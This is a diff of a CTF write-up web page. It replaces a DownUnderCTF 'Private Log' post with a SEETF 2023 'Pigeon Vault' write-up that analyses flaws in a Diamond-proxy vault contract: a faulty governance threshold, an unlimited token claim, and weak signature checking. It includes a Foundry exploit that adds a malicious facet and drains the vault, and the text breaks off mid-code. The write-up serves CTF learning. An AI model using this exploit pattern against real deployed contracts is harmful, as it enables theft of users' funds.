@@ -6,20 +6,20 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="2022 | DownUnderCTF | blockchain">
+        <meta name="description" content="2023 | SEETF | Smart Contracts">
       
       
         <meta name="author" content="YanhuiJessica">
       
       
-        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/private_log/">
+        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/pigeon_vault/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-8.3.3">
     
     
       
-        <title>Blockchain - Private Log - Chictf-Writeups</title>
+        <title>Blockchain - Pigeon Vault - Chictf-Writeups</title>
       
     
     
@@ -113,7 +113,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Blockchain - Private Log
+              Blockchain - Pigeon Vault
             
           </span>
         </div>
@@ -2194,14 +2194,12 @@
               
   
   
-    
-  
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_5" type="checkbox" id="__nav_7_5" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_5" type="checkbox" id="__nav_7_5" >
       
       
       
@@ -2236,75 +2234,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          Private Log
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../private_log/" class="md-nav__link">
         Private Log
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    题目
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    解题思路
-  </a>
-  
-    <nav class="md-nav" aria-label="解题思路">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    Exploit
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#flag" class="md-nav__link">
-    Flag
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -2480,12 +2414,14 @@
               
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_14" type="checkbox" id="__nav_7_14" >
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_14" type="checkbox" id="__nav_7_14" checked>
       
       
       
@@ -2548,11 +2484,75 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../pigeon_vault/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Pigeon Vault
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         Pigeon Vault
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    题目
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    解题思路
+  </a>
+  
+    <nav class="md-nav" aria-label="解题思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -3198,27 +3198,33 @@
   
   <div style="color: gray;">
     <small>
-      2022 | DownUnderCTF | blockchain
+      2023 | SEETF | Smart Contracts
     </small>
   </div>
   
 
   
                 
-  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/private_log.md" title="编辑此页" class="md-content__button md-icon">
+  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/pigeon_vault.md" title="编辑此页" class="md-content__button md-icon">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
   </a>
 
 
 
-  <h1>Private Log</h1>
+  <h1>Pigeon Vault</h1>
 
 <div class="md-typeset">
     <div class="blogging-tags-grid">
 
         <a href="#smart contract" class="blogging-tag"><code>#smart contract</code></a>
 
-        <a href="#proxy contract" class="blogging-tag"><code>#proxy contract</code></a>
+        <a href="#diamond" class="blogging-tag"><code>#diamond</code></a>
+
+        <a href="#proxy" class="blogging-tag"><code>#proxy</code></a>
+
+        <a href="#data validation" class="blogging-tag"><code>#data validation</code></a>
+
+        <a href="#ecrecover" class="blogging-tag"><code>#ecrecover</code></a>
 
     </div>
 
@@ -3244,229 +3250,156 @@
     }
 </style>
 <h2 id="_1">题目<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<p>I thought I would try and save some gas by updating my log entries with assembly, I'm not super sure if it's safe, but I have added a password for good measure.</p>
-<p>But it's okay because if there is a bug I can always upgrade since I'm using the <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/transparent/TransparentUpgradeableProxy.sol">TransparentUpgradeableProxy</a> pattern :).</p>
-<p>I love my creation so much that I add a new log every minute!</p>
-<p>Note the block time on this challenge is 23 seconds, so there will a delay in deploying and resetting the challenge.</p>
-<p>Goal: Steal all funds from the contract.</p>
-<details class="note">
-<summary>PrivateLog.sol</summary>
-<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<p>rainbowpigeon has just received a massive payout from his secret business, and he now wants to create a secure vault to store his cryptocurrency assets. To achieve this, he developed PigeonVault, and being a smart guy, he made provisions for upgrading the contract in case he detects any vulnerability in the system.</p>
+<p>Find out a way to steal his funds before he discovers any flaws in his implementation.</p>
+<p>Blockchain has a block time of 10: <a href="https://book.getfoundry.sh/reference/anvil/">https://book.getfoundry.sh/reference/anvil/</a></p>
+<blockquote>
+<p>nc win.the.seetf.sg 8552</p>
+</blockquote>
+<p><a href="../static/pigeon_vault.zip"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 20h14v-2H5m14-9h-4V3H9v6H5l7 7 7-7Z"/></svg></span> <code>pigeon_vault.zip</code></a></p>
+<h2 id="_2">解题思路<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p>需要成为 diamond 合约的所有者且持有不少于 3000 ether (即清空 <code>pigeonDiamond</code> 的余额)</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">isSolved</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="nx">IOwnershipFacet</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pigeonDiamond</span><span class="p">)).</span><span class="nx">owner</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">3000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p><code>PigeonDiamond</code> 采用了 Diamond Storage 和 App Storage 混合的存储模式</p>
+</li>
+<li>
+<p>先了解一下应用层面切面的功能</p>
+<ul>
+<li>
+<p><code>DAOFacet</code></p>
+<ul>
+<li>
+<p><code>submitProposal()</code> 由于 <code>isUserGovernance()</code> 阈值设置存在问题，任意用户可以提交操作切面的提案</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">isUserGovernance</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_user</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">totalSupply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">totalSupply</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">userBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">LibDAO</span><span class="p">.</span><span class="nx">getCurrentVotes</span><span class="p">(</span><span class="nx">_user</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">threshold</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">userBalance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">100</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">totalSupply</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">userBalance</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">threshold</span><span class="p">;</span><span class="w">    </span><span class="c1">// If userBalance equals 0, then the threshold is 0 and satisfies this condition</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p><code>executeProposal()</code> 执行指定提案</p>
+<ul>
+<li>提案的 <code>forVotes</code> 需要大于 <code>againstVotes</code> 以及十分之一的 <code>totalSupply</code></li>
+</ul>
+</li>
+<li><code>castVoteBySig()</code> 验证签名并为提案投票<ul>
+<li>只检查 <code>signer</code> 不为 <code>address(0)</code>，因此可以是无效签名</li>
+<li>票数为 <code>msg.sender</code>（而不是 <code>signer</code>）在 <code>proposal.startBlock</code> 前最后一次记录的票数</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>FTCFacet</code> FeatherCoin，与 <a href="../diamond_heist/#解题思路">Diamond Heist</a> 类似的模式</p>
+</li>
+<li><code>OwnershipFacet</code> 使用 Diamond 存储模式管理 <code>contractOwner</code></li>
+<li><code>PigeonVaultFacet</code><ul>
+<li><code>emergencyWithdraw()</code> owner 可以取出合约所有的 ether</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>另外，在 <code>Setup</code> 中，由于没有更新 <code>claimed</code>，任何人可以调用任意次 <code>claim()</code> 来获得 <code>FTC</code></p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">claim</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="o">!</span><span class="nx">claimed</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;You already claimed&quot;</span><span class="p">);</span>
 
-<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pigeonDiamond</span><span class="p">)).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="mf">10</span><span class="nx">_000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Failed to send&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>比较简单直接的方法是调用 11 次 <code>claim()</code> 来获取达到执行提案阈值的票数，也可通过 <code>castVoteBySig()</code> 进行多次投票</p>
+</li>
+</ul>
+<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.17</span><span class="p">;</span>
 
-<span class="cm">/**</span>
-<span class="cm"> * @title Private Log</span>
-<span class="cm"> * @author Blue Alder (https://duc.tf)</span>
-<span class="cm"> **/</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;forge-std/Test.sol&quot;</span><span class="p">;</span>
 
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/proxy/utils/Initializable.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../src/Setup.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../src/libraries/LibDiamond.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../src/interfaces/IDAOFacet.sol&quot;</span><span class="p">;</span>
 
+<span class="kr">interface</span><span class="w"> </span><span class="nx">IFTCFacet</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">delegate</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_delegatee</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
+<span class="p">}</span>
 
-<span class="nx">contract</span><span class="w"> </span><span class="nx">PrivateLog</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Initializable</span><span class="w"> </span><span class="p">{</span>
+<span class="nx">contract</span><span class="w"> </span><span class="nx">HackFacet</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">player</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">LibDiamond</span><span class="p">.</span><span class="nx">setContractOwner</span><span class="p">(</span><span class="nx">player</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">payable</span><span class="p">(</span><span class="nx">player</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
 
-<span class="w">    </span><span class="nx">bytes32</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">secretHash</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">string</span><span class="p">[]</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">logEntries</span><span class="p">;</span>
+<span class="nx">contract</span><span class="w"> </span><span class="nx">SolveTest</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="p">{</span>
 
-<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">secretHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEAD</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">Setup</span><span class="w"> </span><span class="nx">setup</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">pigeonDiamond</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">privKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xdead</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">hacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vm</span><span class="p">.</span><span class="nx">addr</span><span class="p">(</span><span class="nx">privKey</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setUp</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">setup</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Setup</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">3000</span><span class="w"> </span><span class="nx">ether</span><span class="p">}();</span>
+<span class="w">        </span><span class="nx">pigeonDiamond</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">setup</span><span class="p">.</span><span class="nx">pigeonDiamond</span><span class="p">());</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">init</span><span class="p">(</span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_secretHash</span><span class="p">)</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">initializer</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">secretHash</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mh">0xDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEAD</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">secretHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_secretHash</span><span class="p">;</span>
-<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testSolve</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">hacker</span><span class="p">);</span>
 
-<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">hasSecret</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">newHash</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">password</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">secretHash</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Incorrect Hash&quot;</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">secretHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newHash</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">_</span><span class="p">;</span>
-<span class="w">    </span><span class="p">}</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">hackFacet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">HackFacet</span><span class="p">());</span>
+<span class="w">        </span><span class="nx">bytes4</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">selectors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">bytes4</span><span class="p">[](</span><span class="mf">1</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">selectors</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bytes4</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;exploit()&quot;</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">IDiamondCut</span><span class="p">.</span><span class="nx">FacetCut</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">diamondCut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IDiamondCut</span><span class="p">.</span><span class="nx">FacetCut</span><span class="p">({</span>
+<span class="w">            </span><span class="nx">facetAddress</span><span class="o">:</span><span class="w"> </span><span class="nx">hackFacet</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">action</span><span class="o">:</span><span class="w"> </span><span class="nx">IDiamondCut</span><span class="p">.</span><span class="nx">FacetCutAction</span><span class="p">.</span><span class="nx">Add</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">functionSelectors</span><span class="o">:</span><span class="w"> </span><span class="nx">selectors</span>
+<span class="w">        </span><span class="p">});</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">viewLog</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">logIndex</span><span class="p">)</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">logEntries</span><span class="p">[</span><span class="nx">logIndex</span><span class="p">];</span>
-<span class="w">    </span><span class="p">}</span><span class="w"> </span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">createLogEntry</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">logEntry</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">newHash</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">hasSecret</span><span class="p">(</span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">newHash</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">bytes</span><span class="p">(</span><span class="nx">logEntry</span><span class="p">).</span><span class="nx">length</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mf">31</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;log too long&quot;</span><span class="p">);</span><span class="w">   </span>
-
-<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">mstore</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="nx">logEntries</span><span class="p">.</span><span class="nx">slot</span><span class="p">)</span>
-<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="nx">length</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">sload</span><span class="p">(</span><span class="nx">logEntries</span><span class="p">.</span><span class="nx">slot</span><span class="p">)</span>
-<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="nx">logLength</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">mload</span><span class="p">(</span><span class="nx">logEntry</span><span class="p">)</span>
-<span class="w">            </span><span class="nx">sstore</span><span class="p">(</span><span class="nx">add</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x20</span><span class="p">),</span><span class="w"> </span><span class="nx">length</span><span class="p">),</span><span class="w"> </span><span class="nx">or</span><span class="p">(</span><span class="nx">mload</span><span class="p">(</span><span class="nx">add</span><span class="p">(</span><span class="nx">logEntry</span><span class="p">,</span><span class="w"> </span><span class="mh">0x20</span><span class="p">)),</span><span class="w"> </span><span class="nx">mul</span><span class="p">(</span><span class="nx">logLength</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">)))</span>
-<span class="w">            </span><span class="nx">sstore</span><span class="p">(</span><span class="nx">logEntries</span><span class="p">.</span><span class="nx">slot</span><span class="p">,</span><span class="w"> </span><span class="nx">add</span><span class="p">(</span><span class="nx">length</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">))</span>
+<span class="w">        </span><span class="nx">IFTCFacet</span><span class="p">(</span><span class="nx">pigeonDiamond</span><span class="p">).</span><span class="nx">delegate</span><span class="p">(</span><span class="nx">hacker</span><span class="p">);</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint8</span><span class="w"> </span><span class="nx">i</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">11</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">setup</span><span class="p">.</span><span class="nx">claim</span><span class="p">();</span>
 <span class="w">        </span><span class="p">}</span>
-<span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">updateLogEntry</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">logIndex</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">logEntry</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">newHash</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">hasSecret</span><span class="p">(</span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">newHash</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">bytes</span><span class="p">(</span><span class="nx">logEntry</span><span class="p">).</span><span class="nx">length</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mf">31</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;log too long&quot;</span><span class="p">);</span><span class="w">   </span>
+<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">proposalId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IDAOFacet</span><span class="p">(</span><span class="nx">pigeonDiamond</span><span class="p">).</span><span class="nx">submitProposal</span><span class="p">(</span><span class="nx">hackFacet</span><span class="p">,</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;exploit(address)&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">hacker</span><span class="p">),</span><span class="w"> </span><span class="nx">diamondCut</span><span class="p">);</span>
+<span class="w">        </span><span class="p">(</span><span class="nx">uint8</span><span class="w"> </span><span class="nx">v</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">s</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vm</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">privKey</span><span class="p">,</span><span class="w"> </span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;\x19Ethereum Signed Message:\n32&quot;</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">signature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">s</span><span class="p">,</span><span class="w"> </span><span class="nx">v</span><span class="p">);</span>
 
-<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="nx">length</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">mload</span><span class="p">(</span><span class="nx">logEntry</span><span class="p">)</span>
